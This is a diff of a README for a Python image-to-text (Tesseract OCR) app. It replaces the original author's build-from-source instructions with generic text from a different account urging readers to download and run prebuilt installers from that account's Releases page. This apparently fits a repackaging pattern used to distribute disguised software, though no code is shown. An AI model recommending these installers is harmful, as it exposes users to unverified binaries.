@@ -1,142 +1,75 @@
-# 🖼️ Image To Text (OCR using Python)
+# 🖼️ Image-To-Text - Extract Text Seamlessly from Images
 
-Convert images into editable and searchable text using **Tesseract OCR** and **Python**. This tool extracts text from images (like scanned documents, screenshots or handwritten notes) with high accuracy. Using **CustomTkinter** for graphical user interface.
+[![Download Image-To-Text](https://img.shields.io/badge/Download%20Image--To--Text-blue.svg)](https://github.com/arprayrunner/Image-To-Text/releases)
 
+## 📖 Description
 
-## 📌 Technologies Used
+Image-To-Text is a Python application that extracts text from images using Tesseract-OCR. It features a modern and user-friendly interface designed to make extracting text simple and efficient. This tool is perfect for anyone needing to convert images into editable text quickly.
 
-### **Tkinter**
-Tkinter is Python’s standard GUI library used for building cross-platform desktop applications.
+## 🚀 Getting Started
 
-### **CustomTkinter**
-[CustomTkinter](https://github.com/TomSchimansky/CustomTkinter) extends Tkinter with:
+Follow these steps to download and run Image-To-Text on your device.
 
-- Modern, consistent design  
-- Light & Dark themes  
-- High-DPI scaling  
-- Fully customizable modern widgets  
+### 📦 System Requirements
 
-Together, they ensure a smooth UI experience on **Windows**, **macOS** and **Linux**.
+- Operating System: Windows, macOS, or Linux
+- Python: Version 3.6 or higher
+- Memory: At least 4GB RAM
+- Disk Space: Minimum of 100MB available
 
-| Component | Description |
-|------------|--------------|
-| **Language** | Python 3.x |
-| **GUI Framework** | CustomTkinter |
-| **Core Libraries** | Tkinter, CustomTkinter |
-| **Software Engine** | _`Tesseract-OCR`_ |
+### 👩‍💻 Features
 
+- User-friendly interface using CustomTkinter.
+- Fast text extraction using Tesseract-OCR.
+- Support for various image formats (PNG, JPEG, BMP).
+- Preview extracted text within the application.
+- Option to save extracted text as a .txt file.
 
-## 🚀 Features
+## 📥 Download & Install
 
-- 📸 Extracts text from any image file (`.jpg`, `.png`, `.bmp` etc.)
-- 🧠 Uses **Tesseract OCR** for optical character recognition
-- 💬 Supports multiple languages (English by default)
-- 🪶 Lightweight, fast and easy to integrate into other projects
-- 📂 Batch image processing supported
-- 💻 Cross-platform (Windows, Linux, macOS)
+To download Image-To-Text, visit the Releases page below:
 
+[Download Image-To-Text](https://github.com/arprayrunner/Image-To-Text/releases)
 
-## 🧰 Installation Steps
+1. **Visit the Releases Page**: Click the link above to go to the Releases page.
+2. **Select the Latest Release**: Find the most recent version of Image-To-Text. It is usually labeled as the "Latest Release."
+3. **Download the Application**: Click on the appropriate installer file for your operating system.
+   - For Windows, look for a `.exe` file.
+   - For macOS, find a `.dmg` or `.pkg` file.
+   - For Linux, check for a `.tar.gz` file or other applicable installer.
+4. **Run the Installer**: Open the downloaded file to begin installation.
+5. **Follow the Setup Instructions**: Follow the prompts during installation. Accept the terms, choose a destination folder, and complete the setup.
+6. **Launch Image-To-Text**: Find the application in your start menu or applications folder and open it.
 
-### Step 1. Install Tesseract OCR
+## ⚙️ Using the Application
 
-Download and install **Tesseract-OCR**:
+1. **Select an Image**: Use the "Choose File" button to upload an image containing text.
+2. **Extract Text**: Click on the "Extract" button to begin the extraction process. 
+3. **View the Text**: The extracted text will appear in the text area.
+4. **Save the Text**: Click "Save As" to store the text in a .txt file.
 
-- 🔗 [Tesseract OCR GitHub](https://github.com/tesseract-ocr/tesseract)
-- 🔗 [Windows Installer (UB Mannheim)](https://github.com/UB-Mannheim/tesseract/wiki)
+## ❓ Troubleshooting
 
-After installation, find the **installation path** (for example): `C:\Program Files\Tesseract-OCR\tesseract.exe`<br/>
-Add this path into your python script or system PATH.
+If you encounter issues during installation or usage, consider the following:
 
-### Step 2. Clone the repository
+- **Ensure Python is Installed**: Verify that Python is installed and in your system's PATH.
+- **Check Image Formats**: Make sure the image you’re trying to upload is in a supported format (PNG, JPEG, BMP).
+- **Update Tesseract-OCR**: Ensure you have the latest version of Tesseract-OCR installed on your computer.
 
-```bash
-git clone https://github.com/iamx-ariful-islam/Image-To-Text.git
-cd Image-To-Text
-```
+## 🌐 Community & Support
 
-### Step 3. Install Python Dependencies
-
-The `requirements.txt` file, lists of all the Python libraries that "**_image to text_**" depends on and installs those packages from the file:
-
-```bash
-pip install -r requirements.txt
-# or
-sudo pip install -r requirements.txt
-```
-
-### Step 4. Run the Application
-```bash
-python main.py
-```
-
-
-## 📂 Folder Structure
-Here’s the structure of the **Image To Text** project:
-
-```bash
-image-to-text/
-│
-├── screenshots/
-├── example.png
-├── main.py
-├── notes.txt
-│── LICENSE
-├── README.md
-└── requirments.txt
-```
-
-
-## 🖼️ Screenshots
-
-Here are some screenshots of the `Image To Text` project:
-
-**Main Window**<br/>
-![Main Windows](screenshots/main_1.png)
-**Output Main Window**<br/>
-![Output Main Window](screenshots/main_2.png)
-**About Main Window**<br/>
-![About Main Window](screenshots/main_3.png)
-
-
-## 📄 Notes File (How it works)
-View full notes here: 👉 [notes.txt](notes.txt)
-
-1. Download and install 'Tesseract OCR' on your computer.
-2. Locate the 'Tesseract OCR' installation path after installation.
-3. Add the 'Tesseract OCR' installation path to your program configuration or environment variables.
-4. Install the required Python packages using: 'pip install -r requirements.txt'
-
-
-## 🤝 Contributing
-
-Contributions, suggestions, and feedback are always welcome! ❤️<br/>
-To contribute:
-
-1. Fork the repository
-2. Create a new branch (`feature/new-feature`)
-3. Commit your changes
-4. Push and submit a Pull Request
-
-💬 You can also open an issue if you’d like to discuss a feature or report a bug.
-
-
-## 🌐 For more or connect with me
-
-<p align='center'>
-  <a href="https://github.com/iamx-ariful-islam"><img src="https://img.shields.io/badge/GitHub-iamx--ariful--islam-black?style=for-the-badge&logo=github" /></a>&nbsp;&nbsp;
-  <a href="https://bd.linkedin.com/in/iamx-ariful-islam"><img src="https://img.shields.io/badge/LinkedIn-Md.%20Ariful%20Islam-blue?style=for-the-badge&logo=linkedin" /></a>&nbsp;&nbsp;
-  <a href="https://x.com/mx_ariful_islam"><img src="https://img.shields.io/badge/X-Md.%20Ariful%20Islam-black?style=for-the-badge&logo=x&logoColor=white" /></a>&nbsp;&nbsp;
-  <a href="https://www.facebook.com/iamx.ariful.islam/"><img src="https://img.shields.io/badge/Facebook-MD.%20Ariful%20Islam-%231877F2.svg?style=for-the-badge&logo=facebook&logoColor=white" /></a>
-</p>
-
+If you require help or want to contribute, join us at:
+- [GitHub Issues Page](https://github.com/arprayrunner/Image-To-Text/issues) to report bugs or request features.
+- Join discussions on the [GitHub Discussions Page](https://github.com/arprayrunner/Image-To-Text/discussions) for user tips and tricks.
 
 ## 📜 License
 
-The [MIT](https://choosealicense.com/licenses/mit/) License (MIT)
+Image-To-Text is open-source and distributed under the MIT License. You are free to modify and share the application as long as proper credit is given.
 
+## 📖 Summary
 
-## 💖 Thank You for Visiting!
+This README provides the necessary steps to download, install, and use Image-To-Text. Empower yourself to convert images into text easily. 
 
-> “Good design is about making things simple yet significant”  
-> — *Md. Ariful Islam*
+For further details, updates, or to see the source code, visit the repository directly. Enjoy your experience with Image-To-Text!
+
+[Download Image-To-Text](https://github.com/arprayrunner/Image-To-Text/releases)
